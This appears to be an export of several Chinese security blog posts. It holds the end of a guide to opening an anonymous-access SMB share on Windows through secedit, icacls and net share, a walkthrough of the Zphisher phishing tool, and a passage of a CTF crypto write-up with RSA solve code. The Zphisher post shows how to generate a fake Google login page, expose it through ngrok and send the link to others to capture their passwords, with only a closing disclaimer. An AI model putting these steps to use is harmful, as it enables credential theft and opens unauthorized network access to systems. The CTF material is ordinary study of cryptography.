<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>secedit <span class="token operator">/</span><span class="token keyword">export</span> <span class="token operator">/</span>cfg gp<span class="token punctuation">.</span>inf <span class="token operator">/</span>quiet</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210201135696.png" alt="image-20211210201135696" /></p>
<p>修改文件 <code>gp.inf</code> ，将 <code>SeDenyNetworkLogonRight = Guest</code>  修改为 <code>SeDenyNetworkLogonRight =</code> ，保存</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210202023334.png" alt="image-20211210202023334" /></p>
<p>重新导入组策略：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>secedit <span class="token operator">/</span>configure <span class="token operator">/</span>db gp<span class="token punctuation">.</span>sdb <span class="token operator">/</span>cfg gp<span class="token punctuation">.</span>inf <span class="token operator">/</span>quiet</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210202111327.png" alt="image-20211210202111327" /></p>
<p>强制刷新组策略，立即生效 (否则，重启后生效)：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>gpupdate<span class="token operator">/</span>force</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211210202229502.png" alt="image-20211210202229502" /></p>
<h3 id="5设置文件共享-2"><a class="anchor" href="#5设置文件共享-2">#</a> 5. 设置文件共享</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>icacls <span class="token constant">C</span><span class="token operator">:</span>\share\ <span class="token operator">/</span><span class="token constant">T</span> <span class="token operator">/</span>grant Everyone<span class="token operator">:</span>r</pre></td></tr><tr><td data-num="2"></td><td><pre>net share share<span class="token operator">=</span>c<span class="token operator">:</span>\share <span class="token operator">/</span>grant<span class="token operator">:</span>everyone<span class="token punctuation">,</span>full</pre></td></tr></table></figure><p>至此，可匿名访问的文件共享服务器开启成功，访问的地址为 <code>//&lt;ip&gt;/smb</code></p>
<h2 id="00x04-开源代码"><a class="anchor" href="#00x04-开源代码">#</a> 00x04 开源代码</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzNnc3R1ZGVudC9JbnZva2UtQnVpbGRBbm9ueW1vdXNTTUJTZXJ2ZXI=">完整的开源 Powershell 代码的项目地址</span></p>
<p>代码在以下操作系统测试成功：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">-</span> Windows <span class="token number">7</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span> Windows <span class="token number">8</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">-</span> Windows <span class="token number">10</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">-</span> Windows Server <span class="token number">2012</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">-</span> Windows Server <span class="token number">2012</span> <span class="token constant">R2</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">-</span> Windows Server <span class="token number">2016</span></pre></td></tr></table></figure><p>支持域环境和工作组环境的 <code>Windows</code>  操作系统</p>
<p>需要本地<strong>管理员</strong>权限执行</p>
<p>开启可匿名访问的文件共享服务器：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Invoke<span class="token operator">-</span>BuildAnonymousSMBServer <span class="token operator">-</span>Path c<span class="token operator">:</span>\share <span class="token operator">-</span>Mode Enable</pre></td></tr></table></figure><p>关闭可匿名访问的文件共享服务器：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Invoke<span class="token operator">-</span>BuildAnonymousSMBServer <span class="token operator">-</span>Path c<span class="token operator">:</span>\share <span class="token operator">-</span>Mode Disable</pre></td></tr></table></figure><p>关闭可匿名访问的文件共享服务器实现了以下操作：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">-</span> 关闭指定目录的共享权限</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span> 禁用Guest用户</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">-</span> 禁用将Everyone权限应用于匿名用户</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">-</span> 删除组策略中指定的匿名共享文件位置</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">-</span> 将Guest用户添加至策略“拒绝从网络访问这台计算机”</pre></td></tr></table></figure><p>在导出组策略时，如果策略 “拒绝从网络访问这台计算机” 中的内容为空，那么不会有这一选项，当我们需要添加这个策略时，需要手动添加一行内容 <code>SeDenyNetworkLogonRight = Guest</code></p>
<p>在代码实现上，我采用了以下方法：</p>
<p>将 <code>SeDenyInteractiveLogonRight = Guest</code>  替换为</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>SeDenyNetworkLogonRight <span class="token operator">=</span> Guest</pre></td></tr><tr><td data-num="2"></td><td><pre>SeDenyInteractiveLogonRight <span class="token operator">=</span> Guest</pre></td></tr></table></figure><p>对应的 <code>Powershell</code>  示例代码：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">(</span>Get<span class="token operator">-</span>Content a<span class="token punctuation">.</span>txt<span class="token punctuation">)</span> <span class="token operator">-</span>replace <span class="token string">"SeDenyInteractiveLogonRight = Guest"</span><span class="token punctuation">,</span><span class="token string">"SeDenyNetworkLogonRight = Guest`r`nSeDenyInteractiveLogonRight = Guest"</span> <span class="token operator">|</span> Set<span class="token operator">-</span>Content <span class="token string">"a.txt"</span></pre></td></tr></table></figure><h2 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly8zZ3N0dWRlbnQuZ2l0aHViLmlvLyVFNiVCOCU5NyVFOSU4MCU4RiVFNiU4QSU4MCVFNSVCNyVBNy0lRTklODAlOUElRTglQkYlODclRTUlOTElQkQlRTQlQkIlQTQlRTglQTElOEMlRTUlQkMlODAlRTUlOTAlQUZXaW5kb3dzJUU3JUIzJUJCJUU3JUJCJTlGJUU3JTlBJTg0JUU1JThDJUJGJUU1JTkwJThEJUU4JUFFJUJGJUU5JTk3JUFFJUU1JTg1JUIxJUU0JUJBJUFC">渗透技巧 —— 通过命令行开启 Windows 系统的匿名访问共享</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>网络钓鱼工具 Zphisher 使用记录</title>
    <url>/article/65c9583.html</url>
    <content><![CDATA[<blockquote>
<p><code>Zphisher</code>  是一款功能强大的开源工具 Phishing Tool。用于对目标进行网络钓鱼攻击。 <code>Zphisher</code>  比社会工程工具包 ( <code>SET</code> ) 更容易。它包含一些由名为 Zphisher 的工具生成的模板，并为 Facebook、Instagram、谷歌、Snapchat、GitHub、雅虎、Proton 邮件、Spotify、Netflix、LinkedIn、WordPress、Origin、Steam、Microsoft 等 18 个流行网站提供钓鱼模板网页。如果有人愿意，它还提供了使用自定义模板的选项。该工具可以轻松执行网络钓鱼攻击。使用此工具，您可以在（广域网）中执行网络钓鱼。此工具可用于获取凭据，例如 id、密码。</p>
</blockquote>
<h3 id="zphisher的用途和特点"><a class="anchor" href="#zphisher的用途和特点">#</a> Zphisher 的用途和特点：</h3>
<ul>
<li>Zphisher 是开源工具。</li>
<li>Zphisher 是 Kali Linux 的一个工具。</li>
<li>Zphisher 用于网络钓鱼攻击。</li>
<li>Zphisher 工具是一个非常简单易用的工具。Zphisher 是用 bash 语言编写的。</li>
<li>Zphisher 工具是一个轻量级的工具。这不会占用额外的空间。</li>
<li>Zphisher 是用 bash 语言编写的。</li>
<li>Zphisher 为 30 多个网站创建了网络钓鱼页面。</li>
<li>Zphisher 创建流行网站的钓鱼页面，例如 Facebook、Instagram、Google、Snapchat、Github、雅虎、Protonmail、Spotify、Netflix、LinkedIn、WordPress、Origin、Steam、Microsoft 等</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220114154001706.png" alt="image-20220114154001706" /></p>
<h3 id="安装"><a class="anchor" href="#安装">#</a> 安装</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>git clone https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cnpmjs<span class="token punctuation">.</span>org<span class="token operator">/</span>htr<span class="token operator">-</span>tech<span class="token operator">/</span>zphisher<span class="token punctuation">.</span>git</pre></td></tr><tr><td data-num="2"></td><td><pre>cd zphisher</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span><span class="token operator">/</span>zphisher<span class="token punctuation">.</span>sh</pre></td></tr></table></figure><p>等待片刻</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220114155557284.png" alt="image-20220114155557284" /></p>
<h3 id="使用方法"><a class="anchor" href="#使用方法">#</a> 使用方法</h3>
<p>安装完成后，终端执行 <code>./zphisher.sh</code> <br />
 如下所示，选择要钓鱼的页面</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220114155644324.png" alt="image-20220114155644324" /></p>
<p>这里我们用 <code>Google</code>  邮箱进行测试，选择测试页面</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220114160137971.png" alt="image-20220114160137971" /></p>
<p>选择测试链接</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220114160224298.png" alt="image-20220114160224298" /></p>
<p>选择好之后，回车即可生成测试链接。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220114155825198.png" alt="image-20220114155825198" /><br />
 访问链接 效果如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220114155929546.png" alt="image-20220114155929546" /><br />
 输入测试信息后，效果如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220114160014346.png" alt="image-20220114160014346" /></p>
<p>也可以使用 <code>ngrok</code>  进行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220114160416289.png" alt="image-20220114160416289" /></p>
<p>这时我们会看到，会给你给出一个由 <code>ngrok</code>  给出的链接</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220114160450200.png" alt="image-20220114160450200" /></p>
<p>也就是说给你搭建好了内网映射，将此链接发给别人，当其输入相关信息时，我么便可以得别人输入的信息。以此来完成网络钓鱼。</p>
<p>另外，在本地的 <code>ip.txt</code>  文件中还有访问 <code>IP</code>  记录</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220114161012380.png" alt="image-20220114161012380" /></p>
<h3 id="后记"><a class="anchor" href="#后记">#</a> 后记</h3>
<p>此外除了这些外国网站，我们还可以改成我们自己的页面。如 <code>QQ邮箱 QQ空间</code> 等。</p>
<h3 id="本文仅供网络安全学习研究请勿非法恶意攻击他人"><a class="anchor" href="#本文仅供网络安全学习研究请勿非法恶意攻击他人">#</a>  <code>本文仅供网络安全学习研究，请勿非法恶意攻击他人。</code></h3>
]]></content>
      <categories>
        <category>STools</category>
      </categories>
      <tags>
        <tag>STools</tag>
      </tags>
  </entry>
  <entry>
    <title>陇原战疫2021网络安全大赛_Crypto部分WP</title>
    <url>/article/243479c5.html</url>
    <content><![CDATA[<h2 id="mostlycommom"><a class="anchor" href="#mostlycommom">#</a> mostlycommom</h2>
<p><strong><span class="exturl" data-url="aHR0cDovL3Rhc2sucHk=">task.py</span>:</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long<span class="token punctuation">,</span> getPrime</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>flag <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="10"></td><td><pre>e1 <span class="token operator">=</span> <span class="token number">65536</span></pre></td></tr><tr><td data-num="11"></td><td><pre>e2 <span class="token operator">=</span> <span class="token number">270270</span></pre></td></tr><tr><td data-num="12"></td><td><pre>c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'message.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'n='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'c1='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'c2='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><strong>message.txt:</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>n<span class="token operator">=</span><span class="token number">122031686138696619599914690767764286094562842112088225311503826014006886039069083192974599712685027825111684852235230039182216245029714786480541087105081895339251403738703369399551593882931896392500832061070414483233029067117410952499655482160104027730462740497347212752269589526267504100262707367020244613503</span></pre></td></tr><tr><td data-num="2"></td><td><pre>c1<span class="token operator">=</span><span class="token number">39449016403735405892343507200740098477581039605979603484774347714381635211925585924812727991400278031892391996192354880233130336052873275920425836986816735715003772614138146640312241166362203750473990403841789871473337067450727600486330723461100602952736232306602481565348834811292749547240619400084712149673</span></pre></td></tr><tr><td data-num="3"></td><td><pre>c2<span class="token operator">=</span><span class="token number">43941404835820273964142098782061043522125350280729366116311943171108689108114444447295511969090107129530187119024651382804933594308335681000311125969011096172605146903018110328309963467134604392943061014968838406604211996322468276744714063735786505249416708394394169324315945145477883438003569372460172268277</span></pre></td></tr></table></figure><p>一眼就能看出是 rsa 中的共模攻击，但是 e1,e2 不互素，且公因数只有一个 2，直接尝试开方。</p>
<p><strong><span class="exturl" data-url="aHR0cDovL2V4cC5weQ==">exp.py</span>:</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">def</span> <span class="token function">modulus</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>e1<span class="token punctuation">,</span>e2<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    </pre></td></tr><tr><td data-num="6"></td><td><pre>    _<span class="token punctuation">,</span>s<span class="token punctuation">,</span>t <span class="token operator">=</span> gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2 <span class="token punctuation">,</span> t <span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n</pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span>m<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    </pre></td></tr><tr><td data-num="10"></td><td><pre>N<span class="token operator">=</span><span class="token number">122031686138696619599914690767764286094562842112088225311503826014006886039069083192974599712685027825111684852235230039182216245029714786480541087105081895339251403738703369399551593882931896392500832061070414483233029067117410952499655482160104027730462740497347212752269589526267504100262707367020244613503</span></pre></td></tr><tr><td data-num="11"></td><td><pre>c1<span class="token operator">=</span><span class="token number">39449016403735405892343507200740098477581039605979603484774347714381635211925585924812727991400278031892391996192354880233130336052873275920425836986816735715003772614138146640312241166362203750473990403841789871473337067450727600486330723461100602952736232306602481565348834811292749547240619400084712149673</span></pre></td></tr><tr><td data-num="12"></td><td><pre>c2<span class="token operator">=</span><span class="token number">43941404835820273964142098782061043522125350280729366116311943171108689108114444447295511969090107129530187119024651382804933594308335681000311125969011096172605146903018110328309963467134604392943061014968838406604211996322468276744714063735786505249416708394394169324315945145477883438003569372460172268277</span></pre></td></tr><tr><td data-num="13"></td><td><pre>e1 <span class="token operator">=</span> <span class="token number">65536</span></pre></td></tr><tr><td data-num="14"></td><td><pre>e2 <span class="token operator">=</span> <span class="token number">270270</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>gcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span>e2<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>modulus<span class="token punctuation">(</span>N<span class="token punctuation">,</span>e1<span class="token punctuation">,</span>e2<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">#SETCTF&#123;now_you_master_common_mode_attack&#125;</span></pre></td></tr></table></figure><h2 id="easytask"><a class="anchor" href="#easytask">#</a> easytask</h2>
<p><strong><span class="exturl" data-url="aHR0cDovL3Rhc2sucHk=">task.py</span>:</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token punctuation">,</span>V</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_random_U</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">get_U1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        A <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> n<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>                <span class="token keyword">if</span> i<span class="token operator">&lt;</span>j<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>                <span class="token keyword">if</span> i<span class="token operator">==</span>j<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>                    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">return</span> A</pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">get_U2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        A <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> n<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>                <span class="token keyword">if</span> i<span class="token operator">></span>j<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                <span class="token keyword">if</span> i<span class="token operator">==</span>j<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>                    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">return</span> A</pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">return</span> get_U1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span>get_U2<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    U <span class="token operator">=</span> get_random_U<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    V <span class="token operator">=</span> matrix<span class="token punctuation">(</span>V<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    W <span class="token operator">=</span> V<span class="token operator">*</span>U</pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">return</span> W</pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_random_r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    n <span class="token operator">=</span> <span class="token number">9</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    delta <span class="token operator">=</span> <span class="token number">4</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    r <span class="token operator">=</span> random_vector<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> n<span class="token punctuation">,</span> x<span class="token operator">=</span><span class="token operator">-</span>delta<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> y<span class="token operator">=</span>delta<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    r <span class="token operator">=</span> matrix<span class="token punctuation">(</span>r<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">return</span> r</pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    M <span class="token operator">=</span> <span class="token punctuation">[</span>getPrime<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    m <span class="token operator">=</span> matrix<span class="token punctuation">(</span>M<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    W <span class="token operator">=</span> get_public_key<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    r <span class="token operator">=</span> get_random_r<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    e <span class="token operator">=</span> m<span class="token operator">*</span>W<span class="token operator">+</span>r</pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e ="</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"W ="</span><span class="token punctuation">,</span>W<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">return</span> M</pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token keyword">def</span> <span class="token function">new_encrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    M <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    key <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token 